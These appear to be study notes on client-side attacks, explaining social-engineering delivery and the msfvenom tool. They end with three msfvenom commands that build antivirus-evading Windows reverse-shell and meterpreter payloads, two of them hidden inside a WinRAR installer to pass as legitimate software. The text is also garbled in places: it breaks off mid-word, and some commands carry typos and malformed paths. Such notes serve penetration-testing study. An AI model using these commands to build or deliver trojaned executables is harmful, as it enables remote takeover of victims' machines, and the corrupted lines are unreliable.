--- 
+ A client-side attack is an attack vector that involves coercing a client to execute a
malicious payload on their system that consequently connects back to the attacker
when executed.

+ Client-side attacks typically utilize various social engineering techniques like
generating malicious documents or portable executables (PEs).

+ Client-side attacks take advantage of human vulnerabilities as opposed to
vulnerabilities in services or software running on the target system.

+ Given that this attack vector involves the transfer and storage of a malicious
payload on the client’s system (disk), attackers need to be cognisant of AV
detection.

### Msfvenom

+ Msfvenom is a command line utility that can be used to generate and
encode MSF payloads for various operating systems as well as web
servers.

+ Msfvenom is a combination of two utilities, namely; msfpayload and
msfencode.

+ We can use Msfvenom to generate a malicious meterpreter payload that
can be transferred to a client target system. Once executed, it will connect
back to our pay

``` bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.169.0.36 LPORT=80 -b "\x00" -e x86/shikata_ga_nai -f exe -o /root/Desktop/metasploit/IamNotBad.exe
# encode the payload with shikata_ga_nai

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=80 -e x86/shikata_ga_nai -i 10 -f exe -x $HOME/Downloads/wrar62.exe > -/Desktop/windows_Payloads/winrar.exe

 msfvenom -p windows/seterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -1 10 -f exe -k -x ~/Dowr Loads/wrar602.exe > ~/Desktop/Windows_Payloads/winrar-new.exe
 # -k continue the original behvior of the injectable app
```

